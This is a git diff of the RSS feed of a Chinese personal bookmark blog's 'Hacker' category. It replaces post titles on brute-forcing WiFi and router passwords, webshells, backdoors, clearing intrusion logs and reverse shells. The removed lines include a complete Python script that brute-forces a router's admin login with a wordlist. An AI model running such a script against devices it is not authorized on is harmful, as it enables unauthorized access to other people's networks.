@@ -12,7 +12,7 @@
 	<atom:link href="https://myiszero.github.io/mywebsite/category/hacker/feed" rel="self" type="application/rss+xml" />
 	<link>https://myiszero.github.io/mywebsite</link>
 	<description>我的收藏夹</description>
-	<lastBuildDate>Sat, 15 Oct 2022 09:21:45 +0000</lastBuildDate>
+	<lastBuildDate>Sun, 23 Oct 2022 15:08:20 +0000</lastBuildDate>
 	<language>zh-CN</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,70 +20,13 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=6.0.2</generator>
 	<item>
-		<title>暴力破解路由器管理密码</title>
-		<link>https://myiszero.github.io/mywebsite/1271.html</link>
+		<title>使用Aircrack-ng套件在5Ghz无线网频段</title>
+		<link>https://myiszero.github.io/mywebsite/1307.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 09:15:12 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 15:08:20 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1271</guid>
-
-					<description><![CDATA[转自 # -*- coding: utf-8 -*- import reques &#8230; <a href="https://myiszero.github.io/mywebsite/1271.html">继续阅读 <span class="meta-nav">&#8594;</span></a>]]></description>
-										<content:encoded><![CDATA[<p>转<a href="https://blog.csdn.net/qq_21078159/article/details/106730677" target="_blank" rel="noopener">自</a></p>
-<p><span id="more-1271"></span></p>
-<pre class="pure-highlightjs"><code class="hljs dts"># -*- coding: utf-8 -*-
-
-import requests
-from itertools import islice
-import sys
-headers = {
-'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
-'Cookie':'LOGINCOUNT=1; LOGIN_PSD_REM_FLAG=0; PSWMOBILEFLAG=true'
-}
-
-def post(passwd):
-data="psd="+passwd
-res = requests.post(url="http://192.168.124.1/router_password_mobile.asp"
-,data=data,headers=headers)
-if('var resultInfo="true;0";' in res.text):
-return True
-else:
-return False
-
-def record(content):
-with open("E:/work/36.4GB-18_in_1.lst/passwd.txt", 'w') as file:
-file.write(content)
-
-def readDic(skip):
-linenum = skip - 1
-with open("E:/work/36.4GB-18_in_1.lst/18_in_1.lst", 'r') as file:
-for line in islice(file,skip,None):
-linenum = linenum+1
-line=line.replace('\n',"")
-res=post(line)
-print(str(linenum)+" "+line+" "+str(res), end="|")
-if(res):
-print("FOUND!")
-record("FOUND! "+str(linenum)+" "+line+" "+str(res))
-break
-if(linenum%1000 == 0):
-record(str(linenum)+" "+line+" "+str(res))
-if __name__ == "__main__":
-
-readDic(0)</code></pre>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>HackTheBox &#8211; Oopsie</title>
-		<link>https://myiszero.github.io/mywebsite/1256.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 08:56:09 +0000</pubDate>
-				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1256</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1307</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -92,13 +35,13 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>清除日志</title>
-		<link>https://myiszero.github.io/mywebsite/1244.html</link>
+		<title>Python实现穷举法连接WiFi【小白也能实现】</title>
+		<link>https://myiszero.github.io/mywebsite/1303.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 08:47:31 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 15:06:32 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1244</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1303</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -107,13 +50,13 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>入侵后清除脚印</title>
-		<link>https://myiszero.github.io/mywebsite/1242.html</link>
+		<title>Hashcat的使用手册总结</title>
+		<link>https://myiszero.github.io/mywebsite/1301.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 08:46:24 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 15:04:44 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1242</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1301</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -122,13 +65,13 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>App 爬虫神器！Mitmproxy 快速带你入坑！</title>
-		<link>https://myiszero.github.io/mywebsite/1240.html</link>
+		<title>WiFi暴力破解工具 字典破解</title>
+		<link>https://myiszero.github.io/mywebsite/1299.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 08:42:31 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 15:03:23 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1240</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1299</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -137,13 +80,13 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>推荐无线网卡</title>
-		<link>https://myiszero.github.io/mywebsite/1238.html</link>
+		<title>密码字典</title>
+		<link>https://myiszero.github.io/mywebsite/1296.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 07:27:19 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 15:00:16 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1238</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1296</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -152,13 +95,13 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>勒索软件解密工具</title>
-		<link>https://myiszero.github.io/mywebsite/1229.html</link>
+		<title>Linux 入侵痕迹清理技巧</title>
+		<link>https://myiszero.github.io/mywebsite/1290.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 05:46:21 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 14:50:32 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1229</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1290</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -167,13 +110,13 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>wdcp后台默认用户密码是多少?wdlinux.cn</title>
-		<link>https://myiszero.github.io/mywebsite/1225.html</link>
+		<title>linux系统入侵留后门方法+日志清除</title>
+		<link>https://myiszero.github.io/mywebsite/1288.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 05:26:53 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 14:49:33 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1225</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1288</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -182,13 +125,13 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>WDCP 重大漏洞 密码为明文 直接用PHP能读取到密码 默认直接跨站</title>
-		<link>https://myiszero.github.io/mywebsite/1223.html</link>
+		<title>渗透利器Weevely之奇淫技巧篇</title>
+		<link>https://myiszero.github.io/mywebsite/1285.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 05:26:05 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 14:48:42 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1223</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1285</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -197,13 +140,28 @@ readDic(0)</code></pre>
 		
 			</item>
 		<item>
-		<title>照弹不误：出站端口受限环境下反弹Shell的思考</title>
-		<link>https://myiszero.github.io/mywebsite/1206.html</link>
+		<title>【Kali】渗透利器 Weevely 4.0 &#8212;Linux版本菜刀使用详解</title>
+		<link>https://myiszero.github.io/mywebsite/1283.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 15 Oct 2022 04:13:03 +0000</pubDate>
+		<pubDate>Sun, 23 Oct 2022 14:47:55 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1206</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1283</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>与佛论禅</title>
+		<link>https://myiszero.github.io/mywebsite/1281.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sun, 23 Oct 2022 14:45:29 +0000</pubDate>
+				<category><![CDATA[Hacker]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1281</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
